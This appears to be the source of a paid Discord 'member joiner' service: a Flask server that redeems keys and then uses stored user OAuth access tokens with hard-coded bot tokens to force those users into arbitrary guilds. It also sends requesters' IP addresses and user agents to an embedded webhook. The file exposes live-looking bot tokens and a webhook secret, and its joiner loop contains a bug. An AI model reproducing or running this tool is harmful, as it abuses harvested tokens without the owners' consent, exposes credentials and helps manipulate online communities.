import os, sys
import json, time
import requests
from flask import Flask, request, jsonify, redirect
from threading import Thread
from discord import Embed
from dhooks import Webhook

hook = Webhook("https://discord.com/api/webhooks/1118078324988710932/0jNWwqaDZHiFMgeY8bFqnxeq7FufbWAVudxruFIG1w_RfkSIlVT6INeATgUSAfjQwAP7")
os.system("clear")
app = Flask(__name__)

offline_token = 'MTExODA2NzYzNDU4ODYxNDY4Ng.G1krKC.0ZRj486HoCkdZspXFUSG8RbrttkC-drPnbbtN4'
online_token = 'MTExODQwOTgxODE2NDY5NTE3MA.GzOWCb.vhwqN71cotbF65ORxhm8yik_l-58Ltuj3UVyn0'

f = open("running.txt", "w")
f.write("")
f.close()
API_ENDPOINT = 'https://canary.discord.com/api/v9'

def update_join_count(guild_id, type:str):
  # return 0 
    filename = f"guilds/{guild_id}.txt"
    try:
        with open(filename, "r") as f:
            count = int(f.read())
    except FileNotFoundError:
        with open(filename, "w") as f:
            count = 0
            f.write(str(count))
            f.close()

    count += 1
    with open(filename, "w") as f:
        f.write(str(count))
        f.close()
    return count

running_tasks = []

def add_to_guild(access_token, userID , guild_Id, key_type):
    tkn = offline_token if key_type == 'offline' else online_token
    while True:
        url = f"{API_ENDPOINT}/guilds/{guild_Id}/members/{userID}"
        botToken = tkn
        data = {
        "access_token" : access_token,
    }
        headers = {
        "Authorization" : f"Bot {botToken}",
        'Content-Type': 'application/json'

    }
        response = requests.put(url=url, headers=headers, json=data)
        #print(response.text)
        if response.status_code in (200, 201, 204):
          if "joined" not in response.text:
            print(f"[INFO]: user {userID} already in {guild_Id}")
            return "already"
          c = update_join_count(guild_Id, key_type)
          print(f"{c} [{key_type.upper()}]: successfully added {userID} to {guild_Id}")
          return "200-ok"
        elif response.status_code == 429:
           if 'retry_after' in response.text:
               sleepxd = response.json()['retry_after']
               print("[DEBUG]: sleeping for:", sleepxd, "seconds")
               time.sleep(sleepxd)
               continue
           else:
             os.system("kill 1")
        elif "missing perm" in response.text.lower():
          print("[DEBUG]:", response.text)
          return "perms error"
        else:
          print("[DEBUG]:", response.text)
        return "4xx-err"

def joiner(guild_id, key_type, start_from, amount):
    with open(f'{key_type}.txt', 'r') as f:
        count = 0
        line_no = 0 
        for line in f:
            line_no = 0 
            if count < start_from:
                count += 1
                continue
            if count >= start_from + amount:
                f = open('running.txt', 'r').read.splitlines()
                f2 = open('running.txt', 'a')
                for i in f:
                  if guild_id in i:
                    continue
                  f2.write(i + "\n")
                break
            user_id, access_token, re = line.strip().split(':')
            ok = add_to_guild(access_token, user_id, guild_id, key_type)
            try:
              if "200-ok" in ok:
                count += 1
              elif "already" in ok:
                continue
              elif "perms error" in ok:
                em = Embed(title="Error", description=f"Bot removed from server / is timedout or dosen't have invite permission.\nGUILD: {guild_id}\nTYPE: {key_type}\nAMOUNTL {amount}", color=00000)
                hook.send(embed=em)
                print("bot removed")
                break
              elif "4xx-err" in ok: 
                continue
            except:
              pass





@app.route('/')
def home():
    return jsonify({'discord': 'exploit#1337'}), 200

@app.route('/callback')
def callback():
    try:
      code = request.args.get('code')
      guild_id = request.args.get('guild_id')
      key = request.args.get('state')  
    except:
      return "error"
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    with open('keys.json', 'r') as f:
      keys_data = json.load(f)
    key_data = keys_data.get(key)
    if key_data is None:
        em = Embed(description=f"Invalid key use attempt\nIP: {ip}\nUA: {ua}\nKey: {key}\nGuild: {guild_id}", color=00000)
        hook.send(embed=em)
        return jsonify({'error': 'Invalid key'}), 400

    uses_remaining = key_data['uses']
    if uses_remaining == 0:
        em = Embed(description=f"Key has no uses remaining\nIP: {ip}\nUA: {ua}\nKey: {key}\nGuild: {guild_id}", color=00000)
        hook.send(embed=em)
        return jsonify({'error': 'Key already redeemed or has no uses remaining'}), 400

    key_data['uses'] -= 1
    with open('keys.json', 'w') as f:
        json.dump(keys_data, f, indent=4)
    key_type = key_data['type']
    amount = key_data['amount']
    start_from = key_data['start']
    try:
        Thread(target=joiner, args=(guild_id, key_type, start_from, amount)).start()
        uses_remaining -= 1
        f = open("running.txt", "a")
        f.write(f"{guild_id}\n")
        f2 = open(f"guilds/{guild_id}-total.txt", "a")
        f2.write(str(amount))
        em = Embed(description=f"Key used\nIP: {ip}\nUA: {ua}\nKey: {key}\nKey Type: {key_type}\nGuild: {guild_id}", color=00000)
        hook.send(embed=em)
        return jsonify({
            'key': key,
            'uses_remaining': uses_remaining,
            'type': key_type,
            'amount': amount,
            'status': 'success',
            'guild': str(guild_id)
        })
    except Exception as e:
        print(e)
        hook.send(e)
        return jsonify({'error': 'Invalid guild'}), 400
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)

